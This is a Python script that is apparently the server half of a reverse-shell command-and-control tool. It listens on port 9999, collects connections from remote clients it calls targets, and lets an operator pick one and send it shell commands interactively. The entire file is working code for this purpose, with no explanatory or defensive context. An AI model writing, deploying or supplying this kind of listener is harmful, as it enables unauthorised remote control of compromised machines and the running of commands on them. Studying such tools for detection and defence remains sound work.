#!/usr/bin/python3

import socket
import threading
import time
from queue import Queue

HOST = "0.0.0.0"
PORT = 9999

connections = []
addresses = []
socket_ready = threading.Event()
queue = Queue()
lock = threading.Lock()

def create_socket():
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

def bind_socket():
    while True:
        try:
            server_socket.bind((HOST, PORT))
            server_socket.listen(5)
            print(f"Socket bound to {HOST}:{PORT}")
            socket_ready.set()
            break
        except socket.error as msg:
            print(f"Bind failed: {msg}")
            time.sleep(2)

def accept_connections():
    socket_ready.wait()
    while True:
        try:
            conn, addr = server_socket.accept()
            conn.setblocking(1)
            with lock:
                connections.append(conn)
                addresses.append(addr)
            print(f"Connection established: {addr[0]}:{addr[1]}")
        except Exception as e:
            print(f"Error accepting connection: {e}")

def list_connections():
    print("CLIENTS:")
    with lock:
        for i in range(len(connections)-1, -1, -1):
            conn = connections[i]
            try:
                conn.send(b' ')
                conn.recv(1)
                print(f"{i} {addresses[i][0]}:{addresses[i][1]}")
            except:
                del connections[i]
                del addresses[i]

def get_target(index):
    with lock:
        if 0 <= index < len(connections):
            return connections[index]
        else:
            print("Invalid selection")
            return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input(f"{conn.getpeername()[0]}> ")
            if cmd.strip() == "quit":
                break
            if cmd:
                conn.send((cmd + '\n').encode('utf-8')) 
                data = conn.recv(20480)
                if not data:
                    print("Client disconnected.")
                    break
                print(f"Reply> {data.decode('utf-8').strip()}")
        except Exception as e:
            print(f"Communication error: {e}")
            break

def start_shell():
    while True:
        cmd = input("Server Shell> ").strip()
        if cmd == "list":
            list_connections()
        elif cmd.startswith("select "):
            try:
                index = int(cmd.split()[1])
                conn = get_target(index)
                if conn:
                    send_target_commands(conn)
            except ValueError:
                print("Please enter a valid index.")
        elif cmd == "exit":
            break
        else:
            print("Command not recognized.")

def worker():
    while True:
        task = queue.get()
        if task == 1:
            create_socket()
            bind_socket()
        elif task == 2:
            start_shell()
        queue.task_done()

def create_workers():
    for _ in range(2):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

def create_jobs():
    queue.put(1)
    queue.put(2)
    queue.join()

if __name__ == "__main__":
    threading.Thread(target=accept_connections, daemon=True).start()
    create_workers()
    create_jobs()
